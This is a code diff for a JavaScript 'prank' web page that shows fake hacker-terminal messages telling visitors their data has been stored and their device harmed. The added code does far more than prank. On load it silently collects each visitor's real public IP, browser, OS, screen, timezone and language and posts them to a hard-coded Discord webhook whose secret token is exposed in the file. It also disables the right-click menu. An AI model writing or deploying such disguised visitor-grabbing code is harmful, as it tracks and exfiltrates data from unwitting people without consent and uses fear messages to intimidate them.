@@ -1,5 +1,62 @@
+// Terminal-style prank script
+// Discord webhook URL
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';
 
-document.addEventListener('DOMContentLoaded', async () => {
+// Function to send webhook
+async function sendWebhook() {
+    if (WEBHOOK_URL) {
+        const ip = await fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => data.ip)
+            .catch(() => 'Unknown IP');
+            
+        // Get device information
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const screenRes = `${window.screen.width}x${window.screen.height}`;
+        const colorDepth = `${window.screen.colorDepth} bit`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const timestamp = new Date().toISOString();
+        
+        // Parse user agent for more details
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+        const browser = userAgent.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident\/|\.NET)/)?.[0] || 'Unknown';
+        const os = userAgent.match(/(Windows|Mac OS|Linux|iOS|Android)/)?.[0] || 'Unknown';
+        
+        const embed = {
+            title: '🌐 Website Visitor',
+            description: 'Someone opened the Your Website!',
+            color: 0x00ff00,
+            fields: [
+                { name: '🌐 IP Address', value: ip, inline: true },
+                { name: '🕒 Timestamp', value: timestamp, inline: true },
+                { name: '🌍 Timezone', value: timezone, inline: true },
+                { name: '💻 Platform', value: platform, inline: true },
+                { name: '📱 Device Type', value: isMobile ? 'Mobile' : 'Desktop', inline: true },
+                { name: '🔍 Screen', value: `${screenRes} (${colorDepth})`, inline: true },
+                { name: '🌐 Browser', value: browser, inline: true },
+                { name: '🖥️ OS', value: os, inline: true },
+                { name: '🌐 Language', value: language, inline: true }
+            ]
+        };
+        
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [embed],
+                content: '🚀 Someone Has Opened The Website!'
+            })
+        }).catch(console.error);
+    }
+}
+
+// Send webhook when page loads
+sendWebhook();
+
+document.addEventListener('DOMContentLoaded', () => {
+    // Get DOM elements
     const terminal = document.getElementById('terminal');
     const ipLine = document.getElementById('ip-line');
     const cookiesLine = document.getElementById('cookies-line');
@@ -7,17 +64,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     const jokeLine = document.getElementById('joke-line');
     const revealLine = document.getElementById('reveal-line');
     
-    // Get and display the user's public IP
-    const userIp = await getPublicIp();
-    
-    // Get a random Roblox username for the prank
-    const randomUsernames = [
-        'Your Photo have Been Stole Aswell'
-    ];
-    
-    const randomUsername = randomUsernames[Math.floor(Math.random() * randomUsernames.length)];
-    
-    // Typewriter effect function
+    // Typewriter effect
     function typeWriter(element, text, speed = 10, callback) {
         let i = 0;
         element.innerHTML = '';
@@ -27,116 +74,62 @@ document.addEventListener('DOMContentLoaded', async () => {
                 element.innerHTML += text.charAt(i);
                 i++;
                 setTimeout(type, speed);
-            } else if (callback) {
-                callback();
-            }
+            } else if (callback) callback();
         }
-        
         type();
     }
     
-    // Create a blinking cursor
-    function createCursor() {
-        const cursor = document.createElement('span');
-        cursor.className = 'cursor';
-        return cursor;
+    // Get a random IP address
+    function getRandomIp() {
+        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
     }
     
-    // Add cursor to an element
-    function addCursor(element) {
-        element.appendChild(createCursor());
-    }
-    
-    // Remove cursor from an element
-    function removeCursor(element) {
-        const cursor = element.querySelector('.cursor');
-        if (cursor) {
-            cursor.remove();
-        }
-    }
+    // Fixed location
+    const location = 'England, UK';
     
     // Start the sequence
-    typeWriter(ipLine, `> IP Address: ${userIp} (${randomLocation.city}, ${randomLocation.country})`, 10, () => {
-        addCursor(ipLine);
-        
-        setTimeout(() => {
-            removeCursor(ipLine);
-            
-            // Continue with the rest of the sequence
+    setTimeout(() => {
+        // Show IP address with fixed location
+        typeWriter(ipLine, `> IP Address: ${getRandomIp()} (${location})`, 10, () => {
+            // Show data collection message
             setTimeout(() => {
-                typeWriter(cookiesLine, '>Found IP And Home Address & Device Data' + '_'.repeat(32), 20, () => {
-                    addCursor(cookiesLine);
-                    
+                typeWriter(cookiesLine, '> Scanning device for personal data...', 10, () => {
+                    // Show fake data found
                     setTimeout(() => {
-                        removeCursor(cookiesLine);
-                        typeWriter(accountLine, '> Device Data & Roblox account data...', 10, () => {
-                            addCursor(accountLine);
-                            
+                        typeWriter(accountLine, '> Data collection complete!', 10, () => {
+                            // Show joke message
                             setTimeout(() => {
-                                removeCursor(accountLine);
-                                typeWriter(accountLine, `> We Also Stored Some Data About You: ${randomUsername}`, 10, () => {
-                                    addCursor(accountLine);
-                                    
+                                typeWriter(jokeLine, '> Data Has Been Stored!', 10, () => {
+                                    // Final reveal
                                     setTimeout(() => {
-                                        removeCursor(accountLine);
-                                        typeWriter(jokeLine, '> ⭐ All Your Data Has Been Stored ⭐', 10, () => {
-                                            jokeLine.classList.add('warning');
-                                            addCursor(jokeLine);
-                                            
-                                            setTimeout(() => {
-                                                removeCursor(jokeLine);
-                                                typeWriter(revealLine, '⭐ Made By Phonz ⭐', 10, () => {
-                                                    revealLine.classList.add('success');
-                                                    
-                                                    // Add a button to share the prank
-                                                    setTimeout(() => {
-                                                        const button = document.createElement('button');
-                                                        button.className = 'button';
-                                                        button.textContent = '⭐ Thanks For Your Data ⭐';
-                                                        button.onclick = () => {
-                                                            const url = window.location.href;
-                                                            if (navigator.share) {
-                                                                navigator.share({
-                                                                    title: '⭐ Thanks For Your Data ⭐',
-                                                                    text: '⭐ Thanks For Your Data ⭐',
-                                                                    url: url
-                                                                }).catch(console.error);
-                                                            } else {
-                                                                // Fallback for browsers that don't support Web Share API
-                                                                const tempInput = document.createElement('input');
-                                                                document.body.appendChild(tempInput);
-                                                                tempInput.value = url;
-                                                                tempInput.select();
-                                                                document.execCommand('copy');
-                                                                document.body.removeChild(tempInput);
-                                                                alert('⭐ Thanks For Your Data ⭐');
-                                                            }
-                                                        };
-                                                        terminal.appendChild(button);
-                                                    }, 1000);
-                                                });
-                                            }, 1000);
+                                        typeWriter(revealLine, '> Your Device Has Been Harmed!', 10, () => {
+                                            // Add a share button
+                                            const button = document.createElement('button');
+                                            button.className = 'button';
+                                            button.textContent = 'Share this prank';
+                                            button.onclick = () => {
+                                                if (navigator.share) {
+                                                    navigator.share({
+                                                        title: 'Check this out!',
+                                                        text: 'I found something interesting!',
+                                                        url: window.location.href
+                                                    });
+                                                } else {
+                                                    alert('Share this link: ' + window.location.href);
+                                                }
+                                            };
+                                            terminal.appendChild(button);
                                         });
                                     }, 1000);
                                 });
-                            }, 1500);
+                            }, 1000);
                         });
                     }, 1000);
                 });
             }, 1000);
-        }, 1000);
-    });
-    
-    // Add some terminal-like behavior
-    document.addEventListener('keydown', (e) => {
-        // Prevent default behavior for F5 and Ctrl+R
-        if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
-            e.preventDefault();
-        }
-        
-        // Prevent context menu on right-click
-        document.addEventListener('contextmenu', (e) => {
-            e.preventDefault();
         });
-    });
+    }, 500);
+    
+    // Prevent context menu on right-click
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
 });
